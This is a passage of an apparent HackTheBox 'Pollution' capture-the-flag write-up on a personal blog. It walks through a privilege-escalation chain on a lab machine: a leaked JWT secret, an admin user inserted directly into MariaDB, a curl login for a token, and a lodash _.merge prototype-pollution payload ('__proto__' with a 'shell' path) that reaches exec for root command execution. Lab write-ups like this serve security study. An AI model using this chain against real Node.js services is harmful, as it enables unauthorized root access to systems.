        <span class="k">return </span>res.json<span class="o">({</span>Status: <span class="s2">"Error"</span>, Message: <span class="s2">"You are not allowed"</span><span class="o">})</span><span class="p">;</span>
    <span class="o">}</span>
    <span class="k">return </span>res.json<span class="o">({</span>Status: <span class="s2">"Error"</span>, Message: <span class="s2">"You are not allowed"</span><span class="o">})</span><span class="p">;</span>
<span class="o">})</span>

router.get<span class="o">(</span><span class="s1">'/'</span>,<span class="o">(</span>req,res<span class="o">)=&gt;{</span>
    res.json<span class="o">({</span>Status: <span class="s2">"Ok"</span>, Message: <span class="s1">'Read documentation from api in /documentation'</span><span class="o">})</span><span class="p">;</span>
<span class="o">})</span>

router.post<span class="o">(</span><span class="s1">'/messages'</span>,messages<span class="o">)</span><span class="p">;</span>
router.post<span class="o">(</span><span class="s1">'/messages/send'</span>, messages_send<span class="o">)</span><span class="p">;</span>
module.exports <span class="o">=</span> router<span class="p">;</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">routes/admin.js</code></p><div class="language-jsx highlighter-rouge"><div class="code-header"> <span data-label-text="Jsx"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">router</span> <span class="o">=</span> <span class="nx">express</span><span class="p">.</span><span class="nx">Router</span><span class="p">();</span>
<span class="kd">const</span> <span class="nx">User</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">../models/User</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="p">{</span> <span class="nx">decodejwt</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">../functions/jwt</span><span class="dl">'</span><span class="p">)</span>

<span class="c1">//controllers</span>

<span class="kd">const</span> <span class="p">{</span> <span class="nx">messages</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">../controllers/Messages</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="p">{</span> <span class="nx">messages_send</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">../controllers/Messages_send</span><span class="dl">'</span><span class="p">);</span>

<span class="nx">router</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="k">async</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">,</span><span class="nx">next</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="dl">"</span><span class="s2">x-access-token</span><span class="dl">"</span><span class="p">]){</span>

        <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">decodejwt</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="dl">"</span><span class="s2">x-access-token</span><span class="dl">"</span><span class="p">]);</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">token</span><span class="p">){</span>
            <span class="kd">const</span> <span class="nx">find</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">User</span><span class="p">.</span><span class="nx">findAll</span><span class="p">({</span><span class="na">where</span><span class="p">:</span> <span class="p">{</span><span class="na">username</span><span class="p">:</span> <span class="nx">token</span><span class="p">.</span><span class="nx">user</span><span class="p">,</span> <span class="na">role</span><span class="p">:</span> <span class="nx">token</span><span class="p">.</span><span class="nx">role</span><span class="p">}});</span>
            
            <span class="k">if</span><span class="p">(</span><span class="nx">find</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>

                <span class="k">if</span><span class="p">(</span><span class="nx">find</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">username</span> <span class="o">==</span> <span class="nx">token</span><span class="p">.</span><span class="nx">user</span> <span class="o">&amp;&amp;</span> <span class="nx">find</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">role</span> <span class="o">==</span> <span class="nx">token</span><span class="p">.</span><span class="nx">role</span> <span class="o">&amp;&amp;</span> <span class="nx">token</span><span class="p">.</span><span class="nx">role</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span><span class="p">){</span>

                    <span class="k">return</span> <span class="nx">next</span><span class="p">();</span>

                <span class="p">}</span>

                <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span><span class="na">Status</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Error</span><span class="dl">"</span><span class="p">,</span> <span class="na">Message</span><span class="p">:</span> <span class="dl">"</span><span class="s2">You are not allowed</span><span class="dl">"</span><span class="p">});</span>
            <span class="p">}</span>

            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span><span class="na">Status</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Error</span><span class="dl">"</span><span class="p">,</span> <span class="na">Message</span><span class="p">:</span> <span class="dl">"</span><span class="s2">You are not allowed</span><span class="dl">"</span><span class="p">});</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span><span class="na">Status</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Error</span><span class="dl">"</span><span class="p">,</span> <span class="na">Message</span><span class="p">:</span> <span class="dl">"</span><span class="s2">You are not allowed</span><span class="dl">"</span><span class="p">});</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span><span class="na">Status</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Error</span><span class="dl">"</span><span class="p">,</span> <span class="na">Message</span><span class="p">:</span> <span class="dl">"</span><span class="s2">You are not allowed</span><span class="dl">"</span><span class="p">});</span>
<span class="p">})</span>

<span class="nx">router</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span><span class="na">Status</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Ok</span><span class="dl">"</span><span class="p">,</span> <span class="na">Message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Read documentation from api in /documentation</span><span class="dl">'</span><span class="p">});</span>
<span class="p">})</span>

<span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/messages</span><span class="dl">'</span><span class="p">,</span><span class="nx">messages</span><span class="p">);</span>
<span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/messages/send</span><span class="dl">'</span><span class="p">,</span> <span class="nx">messages_send</span><span class="p">);</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">router</span><span class="p">;</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">controllers/Send_messages.js</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre>const Message <span class="o">=</span> require<span class="o">(</span><span class="s1">'../models/Message'</span><span class="o">)</span><span class="p">;</span>
const <span class="o">{</span> decodejwt <span class="o">}</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">'../functions/jwt'</span><span class="o">)</span><span class="p">;</span>
const _ <span class="o">=</span> require<span class="o">(</span><span class="s1">'lodash'</span><span class="o">)</span><span class="p">;</span>
const <span class="o">{</span> <span class="nb">exec</span> <span class="o">}</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">'child_process'</span><span class="o">)</span><span class="p">;</span>

const messages_send <span class="o">=</span> async<span class="o">(</span>req,res<span class="o">)=&gt;{</span>
    const token <span class="o">=</span> decodejwt<span class="o">(</span>req.headers[<span class="s1">'x-access-token'</span><span class="o">])</span>
    <span class="k">if</span><span class="o">(</span>req.body.text<span class="o">){</span>
        const message <span class="o">=</span> <span class="o">{</span>
            user_sent: token.user,
            title: <span class="s2">"Message for admins"</span>,
        <span class="o">}</span><span class="p">;</span>

        _.merge<span class="o">(</span>message, req.body<span class="o">)</span><span class="p">;</span>

        <span class="nb">exec</span><span class="o">(</span><span class="s1">'/home/victor/pollution_api/log.sh log_message'</span><span class="o">)</span><span class="p">;</span>

        Message.create<span class="o">({</span>
            text: JSON.stringify<span class="o">(</span>message<span class="o">)</span>,
            user_sent: token.user
        <span class="o">})</span><span class="p">;</span>
        <span class="k">return </span>res.json<span class="o">({</span>Status: <span class="s2">"Ok"</span><span class="o">})</span><span class="p">;</span>
    <span class="o">}</span>
    <span class="k">return </span>res.json<span class="o">({</span>Status: <span class="s2">"Error"</span>, Message: <span class="s2">"Parameter text not found"</span><span class="o">})</span><span class="p">;</span>
<span class="o">}</span>

module.exports <span class="o">=</span> <span class="o">{</span> messages_send <span class="o">}</span><span class="p">;</span>
</pre></table></code></div></div><p>Alright that’s a lot of files listed, but let me save you from the pain I suffered from staring between these JavaScript files for a couple hours.</p><blockquote class="prompt-tip"><div><p>We have a JWT secret!!</p><p>const SECRET = “JWT_COLLECT_124_SECRET_KEY”</p></div></blockquote><p>This will allow us to sign ourselves a cookie if necessary.</p><div class="language-jsx highlighter-rouge"><div class="code-header"> <span data-label-text="Jsx"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">decodejwt</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="dl">"</span><span class="s2">x-access-token</span><span class="dl">"</span><span class="p">]);</span>
	<span class="k">if</span><span class="p">(</span><span class="nx">token</span><span class="p">){</span>
		<span class="kd">const</span> <span class="nx">find</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">User</span><span class="p">.</span><span class="nx">findAll</span><span class="p">({</span><span class="na">where</span><span class="p">:</span> <span class="p">{</span><span class="na">username</span><span class="p">:</span> <span class="nx">token</span><span class="p">.</span><span class="nx">user</span><span class="p">,</span> <span class="na">role</span><span class="p">:</span> <span class="nx">token</span><span class="p">.</span><span class="nx">role</span><span class="p">}});</span>           
			<span class="k">if</span><span class="p">(</span><span class="nx">find</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
			    <span class="k">if</span><span class="p">(</span><span class="nx">find</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">username</span> <span class="o">==</span> <span class="nx">token</span><span class="p">.</span><span class="nx">user</span> <span class="o">&amp;&amp;</span> <span class="nx">find</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">role</span> <span class="o">==</span> <span class="nx">token</span><span class="p">.</span><span class="nx">role</span> <span class="o">&amp;&amp;</span> <span class="nx">token</span><span class="p">.</span><span class="nx">role</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span><span class="p">){</span>
			        <span class="k">return</span> <span class="nx">next</span><span class="p">();</span>
		    <span class="p">}</span>
</pre></table></code></div></div><p>It looks like we need an admin role in order to access some parts of the API and set that within a request header named “x-access-token”.</p><div class="language-jsx highlighter-rouge"><div class="code-header"> <span data-label-text="Jsx"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="p">{</span> <span class="nx">exec</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">);</span>
<span class="p">...</span>
		<span class="nx">_</span><span class="p">.</span><span class="nx">merge</span><span class="p">(</span><span class="nx">message</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>
		<span class="nx">exec</span><span class="p">(</span><span class="dl">'</span><span class="s1">/home/victor/pollution_api/log.sh log_message</span><span class="dl">'</span><span class="p">);</span>
</pre></table></code></div></div><blockquote class="prompt-danger"><div><p>What so important about this excerpt?</p><p>After luckily landing on XCT’s video regarding Unobtanium, he mentioned that there is a specific vulnerability in JavaScript regarding the _.merge function.</p></div></blockquote><blockquote class="prompt-warning"><div><p>How can we abuse all of this?</p><p>Well, our attack chain is going to be quite an interesting one but here is the attack plan all laid out. First we need to go into MariaDB and create a user with admin privileges. The db user is in charge of the web application in general so we should have write access. After creating our user, we need to login so that we can obtain a JWT for authentication. Pass in the JWT to allow us to make requests to the <code class="language-plaintext highlighter-rouge">/admin/messages/send</code> endpoint. Reason being that this is vulnerable to prototype pollution. Since this is run as root, we most likely will be gaining a root shell if all this is done properly.</p></div></blockquote><h2 id="requesting-authentication"><span class="mr-2">Requesting Authentication</span><a href="#requesting-authentication" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>First create user in MariaDB</p><p>Command: <code class="language-plaintext highlighter-rouge">INSERT INTO users (username, password, role, createdAt, updatedAt) VALUES ('admin', 'password123', 'admin', NOW(), NOW());</code></p><p><img data-src="https://i.imgur.com/k7YnvOB.png" alt="" data-proofer-ignore></p><p>Ignore the first user, that was me testing the registration endpoint mentioned in the documentation. But now that we have a valid admin we can login as, we can request a authentication cookie after logging in.</p><p><em>Note that I used chisel to port forward traffic from 3000 to my 3000.</em></p><p>Command: <code class="language-plaintext highlighter-rouge">curl localhost:3000/auth/login -X POST -d '{"username": "admin", "password": "password123"}' -H "Content-Type: application/json"</code></p><div class="language-jsx highlighter-rouge"><div class="code-header"> <span data-label-text="Jsx"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nx">Status</span>	<span class="p">:</span>	<span class="nx">Ok</span>
	<span class="nx">Header</span>		<span class="p">{</span><span class="mi">1</span><span class="p">}</span>
  <span class="nx">x</span><span class="o">-</span><span class="nx">access</span><span class="o">-</span><span class="nx">token</span>	<span class="p">:</span> <span class="nx">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9eyJ1c2VyIjoiYWRtaW4iLCJpc19hdXRoIjp0cnVlLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2Nzg2OTQzMjAsImV4cCI6MTY3ODY5NzkyMH0ibw</span><span class="o">-</span><span class="nx">iaP8Ca</span><span class="o">-</span><span class="nx">uHOvQvLDpABGUWpcirqNoUKAUlOgmjvQ</span>
</pre></table></code></div></div><p>Now we have a JWT we can pass in. It’s only valid for 1 hour so we shouldn’t stop here.</p><h2 id="prototype-pollution--rce"><span class="mr-2">Prototype Pollution → RCE</span><a href="#prototype-pollution--rce" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>With our JWT, we can begin making requests to the <code class="language-plaintext highlighter-rouge">/admin</code> endpoint that was not accessible earlier. (Although I didn’t show that it was inaccessible without the cookie, you’re just going to have to take my word for it). As mentioned earlier, those few lines in the <code class="language-plaintext highlighter-rouge">Send_messages.js</code> are vulnerable to prototype pollution.</p><blockquote class="prompt-danger"><div><p>What is prototype pollution?</p><p>Prototype pollution is a vulnerability that exists within JavaScript when there is a function that merges data that the user can control. The by injecting into an object’s prototype, we can assign malicious values into all instances of the inherited object. Like all other user input-controlled vulnerabilities, this can be mitigated through input sanitization. For a more detailed description please give the <a href="https://portswigger.net/web-security/prototype-pollution">PortSwigger</a> article a read.</p></div></blockquote><div class="language-jsx highlighter-rouge"><div class="code-header"> <span data-label-text="Jsx"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>  <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">text</span><span class="p">){</span>
      <span class="kd">const</span> <span class="nx">message</span> <span class="o">=</span> <span class="p">{</span>
          <span class="na">user_sent</span><span class="p">:</span> <span class="nx">token</span><span class="p">.</span><span class="nx">user</span><span class="p">,</span>
          <span class="na">title</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Message for admins</span><span class="dl">"</span><span class="p">,</span>
      <span class="p">};</span>

      <span class="nx">_</span><span class="p">.</span><span class="nx">merge</span><span class="p">(</span><span class="nx">message</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>

      <span class="nx">exec</span><span class="p">(</span><span class="dl">'</span><span class="s1">/home/victor/pollution_api/log.sh log_message</span><span class="dl">'</span><span class="p">);</span>

      <span class="nx">Message</span><span class="p">.</span><span class="nx">create</span><span class="p">({</span>
          <span class="na">text</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">message</span><span class="p">),</span>
          <span class="na">user_sent</span><span class="p">:</span> <span class="nx">token</span><span class="p">.</span><span class="nx">user</span>
      <span class="p">});</span>
</pre></table></code></div></div><p>Back to the vulnerable code, if we send in something like <code class="language-plaintext highlighter-rouge">{"text": '{"__proto__": {"shell": "/path/to/executable"}}'}</code> , we can get RCE.</p><blockquote class="prompt-warning"><div><p>Explanation Here, the <strong><code class="language-plaintext highlighter-rouge">__proto__</code></strong> property is set to an object that has a <strong><code class="language-plaintext highlighter-rouge">shell</code></strong> property with a value of the executable path. By doing this, the attacker has modified the prototype of the merged object, allowing them to add arbitrary properties or methods to the object. Later in the code, the <strong><code class="language-plaintext highlighter-rouge">exec()</code></strong> function is called with a shell command that uses the <strong><code class="language-plaintext highlighter-rouge">log.sh</code></strong> script to log a message. Since the attacker has modified the prototype of the merged object, the <strong><code class="language-plaintext highlighter-rouge">exec()</code></strong> function will search for the <strong><code class="language-plaintext highlighter-rouge">shell</code></strong> property in the object’s prototype chain and find it there. This will cause the shell command to execute the attacker’s specified executable path, which is a security vulnerability.</p></div></blockquote><p>That being said, I can just reuse my payload I dropped earlier to gain shell as root since we know this API is being executed as root.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Pollution+-+Dumosuku&url=https%3A%2F%2Fdumosuku.com%2Fposts%2FPollution%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Pollution+-+Dumosuku&u=https%3A%2F%2Fdumosuku.com%2Fposts%2FPollution%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fdumosuku.com%2Fposts%2FPollution%2F&text=Pollution+-+Dumosuku" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Pollution/">Pollution</a><li><a href="/posts/CPTC/">CPTC Regionals & Globals</a><li><a href="/posts/RvBSpring2022/">RvB Spring 2022</a><li><a href="/posts/CPPCyberBootcamps2022/">CPP Cyber Bootcamps 2022</a><li><a href="/posts/HackTheBox/">HackTheBox</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/competitions/">competitions</a> <a class="post-tag" href="/tags/swift/">swift</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/rvb/">rvb</a> <a class="post-tag" href="/tags/ccdc/">ccdc</a> <a class="post-tag" href="/tags/cptc/">cptc</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HackTheBox/"><div class="card-body"> <em class="small" data-ts="1665817200" data-df="ll" > Oct 15, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox</h3><div class="text-muted small"><p> HackTheBox, or HTB for short, is a website that I have used to develop a general penetration testing methodology. The platform provides you with multiple intentionally vulnerable hosts with the i...</p></div></div></a></div><div class="card"> <a href="/posts/CPTC/"><div class="card-body"> <em class="small" data-ts="1675411200" data-df="ll" > Feb 3, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CPTC Regionals & Globals</h3><div class="text-muted small"><p> Preface Collegiate Penetration Testing Competition or CPTC, is an event that emulates what a real world penetration test is like. From scoping out the fictitious company, to the real engagement...</p></div></div></a></div><div class="card"> <a href="/posts/RvBFall2022/"><div class="card-body"> <em class="small" data-ts="1671350400" data-df="ll" > Dec 18, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>RvB Fall 2022</h3><div class="text-muted small"><p> This is the second entry in the RvB series. Red versus Blue, more commonly referred to as RvB, is an event held by SWIFT every semester. During this competition, you, the player, can sign up ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/CPTC/" class="btn btn-outline-primary" prompt="Older"><p>CPTC Regionals & Globals</p></a><div class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></div></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/igota7onmyessay">Derrick Tran</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/competitions/">competitions</a> <a class="post-tag" href="/tags/swift/">swift</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/rvb/">rvb</a> <a class="post-tag" href="/tags/ccdc/">ccdc</a> <a class="post-tag" href="/tags/cptc/">cptc</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
